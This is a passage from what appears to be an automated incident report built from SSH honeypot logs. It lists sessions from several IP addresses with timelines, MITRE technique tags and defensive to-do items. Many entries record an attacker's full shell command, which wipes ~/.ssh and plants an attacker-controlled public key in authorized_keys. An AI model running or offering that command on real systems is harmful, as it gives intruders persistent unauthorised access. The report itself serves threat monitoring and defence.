| `2026-04-12 10:43:59` | `cowrie.command.failed` |
| `2026-04-12 10:43:59` | `cowrie.log.closed` |
| `2026-04-12 10:44:00` | `cowrie.session.params` |
| `2026-04-12 10:44:00` | `cowrie.command.input` |
| `2026-04-12 10:44:00` | `cowrie.session.file_download` |
| `2026-04-12 10:44:00` | `cowrie.log.closed` |
| `2026-04-12 10:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a4cfd8a889

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:44 |
| **Last Seen** | 2026-04-12 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:44:04` | `cowrie.session.connect` |
| `2026-04-12 10:44:04` | `cowrie.client.version` |
| `2026-04-12 10:44:05` | `cowrie.client.kex` |
| `2026-04-12 10:44:05` | `cowrie.login.success` |
| `2026-04-12 10:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ee6313abb7d

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:45 |
| **Last Seen** | 2026-04-12 10:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:45:02` | `cowrie.session.connect` |
| `2026-04-12 10:45:02` | `cowrie.client.version` |
| `2026-04-12 10:45:02` | `cowrie.client.kex` |
| `2026-04-12 10:45:03` | `cowrie.login.success` |
| `2026-04-12 10:45:04` | `cowrie.session.params` |
| `2026-04-12 10:45:04` | `cowrie.command.input` |
| `2026-04-12 10:45:04` | `cowrie.command.failed` |
| `2026-04-12 10:45:04` | `cowrie.log.closed` |
| `2026-04-12 10:45:05` | `cowrie.session.params` |
| `2026-04-12 10:45:05` | `cowrie.command.input` |
| `2026-04-12 10:45:05` | `cowrie.session.file_download` |
| `2026-04-12 10:45:05` | `cowrie.log.closed` |
| `2026-04-12 10:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998da438cd22

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:45 |
| **Last Seen** | 2026-04-12 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:45:08` | `cowrie.session.connect` |
| `2026-04-12 10:45:08` | `cowrie.client.version` |
| `2026-04-12 10:45:08` | `cowrie.client.kex` |
| `2026-04-12 10:45:09` | `cowrie.login.success` |
| `2026-04-12 10:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef7aeb1cd7ce

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:46 |
| **Last Seen** | 2026-04-12 10:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:46:28` | `cowrie.session.connect` |
| `2026-04-12 10:46:28` | `cowrie.client.version` |
| `2026-04-12 10:46:28` | `cowrie.client.kex` |
| `2026-04-12 10:46:30` | `cowrie.login.success` |
| `2026-04-12 10:46:30` | `cowrie.session.params` |
| `2026-04-12 10:46:30` | `cowrie.command.input` |
| `2026-04-12 10:46:30` | `cowrie.command.failed` |
| `2026-04-12 10:46:30` | `cowrie.log.closed` |
| `2026-04-12 10:46:31` | `cowrie.session.params` |
| `2026-04-12 10:46:31` | `cowrie.command.input` |
| `2026-04-12 10:46:31` | `cowrie.session.file_download` |
| `2026-04-12 10:46:31` | `cowrie.log.closed` |
| `2026-04-12 10:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9f8d8dcfcb

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:46 |
| **Last Seen** | 2026-04-12 10:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:46:35` | `cowrie.session.connect` |
| `2026-04-12 10:46:35` | `cowrie.client.version` |
| `2026-04-12 10:46:35` | `cowrie.client.kex` |
| `2026-04-12 10:46:36` | `cowrie.login.success` |
| `2026-04-12 10:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de04148a7ad

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:46 |
| **Last Seen** | 2026-04-12 10:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:46:39` | `cowrie.session.connect` |
| `2026-04-12 10:46:39` | `cowrie.client.version` |
| `2026-04-12 10:46:39` | `cowrie.client.kex` |
| `2026-04-12 10:46:40` | `cowrie.login.success` |
| `2026-04-12 10:46:40` | `cowrie.session.params` |
| `2026-04-12 10:46:40` | `cowrie.command.input` |
| `2026-04-12 10:46:40` | `cowrie.command.failed` |
| `2026-04-12 10:46:40` | `cowrie.log.closed` |
| `2026-04-12 10:46:41` | `cowrie.session.params` |
| `2026-04-12 10:46:41` | `cowrie.command.input` |
| `2026-04-12 10:46:41` | `cowrie.session.file_download` |
| `2026-04-12 10:46:41` | `cowrie.log.closed` |
| `2026-04-12 10:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086b4daaa248

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:46 |
| **Last Seen** | 2026-04-12 10:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:46:43` | `cowrie.session.connect` |
| `2026-04-12 10:46:43` | `cowrie.client.version` |
| `2026-04-12 10:46:43` | `cowrie.client.kex` |
| `2026-04-12 10:46:44` | `cowrie.login.success` |
| `2026-04-12 10:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fdd5831d60f

| Field | Detail |
|---|---|
| **Source IP** | `181.23.113[.]121` |
| **First Seen** | 2026-04-12 10:48 |
| **Last Seen** | 2026-04-12 10:48 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:48:30` | `cowrie.session.connect` |
| `2026-04-12 10:48:30` | `cowrie.client.version` |
| `2026-04-12 10:48:30` | `cowrie.client.kex` |
| `2026-04-12 10:48:32` | `cowrie.login.success` |
| `2026-04-12 10:48:36` | `cowrie.session.params` |
| `2026-04-12 10:48:36` | `cowrie.command.input` |
| `2026-04-12 10:48:36` | `cowrie.command.failed` |
| `2026-04-12 10:48:36` | `cowrie.log.closed` |
| `2026-04-12 10:48:37` | `cowrie.session.params` |
| `2026-04-12 10:48:37` | `cowrie.command.input` |
| `2026-04-12 10:48:37` | `cowrie.session.file_download` |
| `2026-04-12 10:48:37` | `cowrie.log.closed` |
| `2026-04-12 10:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.23.113[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.23.113[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b561c87a0bb

| Field | Detail |
|---|---|
| **Source IP** | `181.23.113[.]121` |
| **First Seen** | 2026-04-12 10:48 |
| **Last Seen** | 2026-04-12 10:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:48:43` | `cowrie.session.connect` |
| `2026-04-12 10:48:43` | `cowrie.client.version` |
| `2026-04-12 10:48:46` | `cowrie.client.kex` |
| `2026-04-12 10:48:48` | `cowrie.login.success` |
| `2026-04-12 10:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.23.113[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.23.113[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872382ec7ff7

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:49 |
| **Last Seen** | 2026-04-12 10:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:49:20` | `cowrie.session.connect` |
| `2026-04-12 10:49:20` | `cowrie.client.version` |
| `2026-04-12 10:49:20` | `cowrie.client.kex` |
| `2026-04-12 10:49:21` | `cowrie.login.success` |
| `2026-04-12 10:49:22` | `cowrie.session.params` |
| `2026-04-12 10:49:22` | `cowrie.command.input` |
| `2026-04-12 10:49:22` | `cowrie.command.failed` |
| `2026-04-12 10:49:22` | `cowrie.log.closed` |
| `2026-04-12 10:49:23` | `cowrie.session.params` |
| `2026-04-12 10:49:23` | `cowrie.command.input` |
| `2026-04-12 10:49:23` | `cowrie.session.file_download` |
| `2026-04-12 10:49:23` | `cowrie.log.closed` |
| `2026-04-12 10:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1aaf6b70ba

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:49 |
| **Last Seen** | 2026-04-12 10:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:49:26` | `cowrie.session.connect` |
| `2026-04-12 10:49:26` | `cowrie.client.version` |
| `2026-04-12 10:49:26` | `cowrie.client.kex` |
| `2026-04-12 10:49:27` | `cowrie.login.success` |
| `2026-04-12 10:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b83b05e782

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:50 |
| **Last Seen** | 2026-04-12 10:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:50:59` | `cowrie.session.connect` |
| `2026-04-12 10:50:59` | `cowrie.client.version` |
| `2026-04-12 10:51:00` | `cowrie.client.kex` |
| `2026-04-12 10:51:01` | `cowrie.login.success` |
| `2026-04-12 10:51:01` | `cowrie.session.params` |
| `2026-04-12 10:51:01` | `cowrie.command.input` |
| `2026-04-12 10:51:01` | `cowrie.command.failed` |
| `2026-04-12 10:51:01` | `cowrie.log.closed` |
| `2026-04-12 10:51:02` | `cowrie.session.params` |
| `2026-04-12 10:51:02` | `cowrie.command.input` |
| `2026-04-12 10:51:02` | `cowrie.session.file_download` |
| `2026-04-12 10:51:02` | `cowrie.log.closed` |
| `2026-04-12 10:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe2bd99c637

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:51 |
| **Last Seen** | 2026-04-12 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:51:05` | `cowrie.session.connect` |
| `2026-04-12 10:51:05` | `cowrie.client.version` |
| `2026-04-12 10:51:05` | `cowrie.client.kex` |
| `2026-04-12 10:51:06` | `cowrie.login.success` |
| `2026-04-12 10:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1887b0220dbc

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:54 |
| **Last Seen** | 2026-04-12 10:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:54:37` | `cowrie.session.connect` |
| `2026-04-12 10:54:37` | `cowrie.client.version` |
| `2026-04-12 10:54:38` | `cowrie.client.kex` |
| `2026-04-12 10:54:38` | `cowrie.login.success` |
| `2026-04-12 10:54:38` | `cowrie.session.params` |
| `2026-04-12 10:54:38` | `cowrie.command.input` |
| `2026-04-12 10:54:38` | `cowrie.command.failed` |
| `2026-04-12 10:54:38` | `cowrie.log.closed` |
| `2026-04-12 10:54:39` | `cowrie.session.params` |
| `2026-04-12 10:54:39` | `cowrie.command.input` |
| `2026-04-12 10:54:39` | `cowrie.session.file_download` |
| `2026-04-12 10:54:39` | `cowrie.log.closed` |
| `2026-04-12 10:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1495c0c3f8a2

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:54 |
| **Last Seen** | 2026-04-12 10:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:54:40` | `cowrie.session.connect` |
| `2026-04-12 10:54:40` | `cowrie.client.version` |
| `2026-04-12 10:54:41` | `cowrie.client.kex` |
| `2026-04-12 10:54:41` | `cowrie.login.success` |
| `2026-04-12 10:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c92a95f48341

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:54 |
| **Last Seen** | 2026-04-12 10:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:54:55` | `cowrie.session.connect` |
| `2026-04-12 10:54:55` | `cowrie.client.version` |
| `2026-04-12 10:54:55` | `cowrie.client.kex` |
| `2026-04-12 10:54:55` | `cowrie.login.success` |
| `2026-04-12 10:54:56` | `cowrie.session.params` |
| `2026-04-12 10:54:56` | `cowrie.command.input` |
| `2026-04-12 10:54:56` | `cowrie.command.failed` |
| `2026-04-12 10:54:56` | `cowrie.log.closed` |
| `2026-04-12 10:54:56` | `cowrie.session.params` |
| `2026-04-12 10:54:56` | `cowrie.command.input` |
| `2026-04-12 10:54:56` | `cowrie.session.file_download` |
| `2026-04-12 10:54:56` | `cowrie.log.closed` |
| `2026-04-12 10:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3733fd2c7911

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:54 |
| **Last Seen** | 2026-04-12 10:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:54:58` | `cowrie.session.connect` |
| `2026-04-12 10:54:58` | `cowrie.client.version` |
| `2026-04-12 10:54:59` | `cowrie.client.kex` |
| `2026-04-12 10:54:59` | `cowrie.login.success` |
| `2026-04-12 10:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

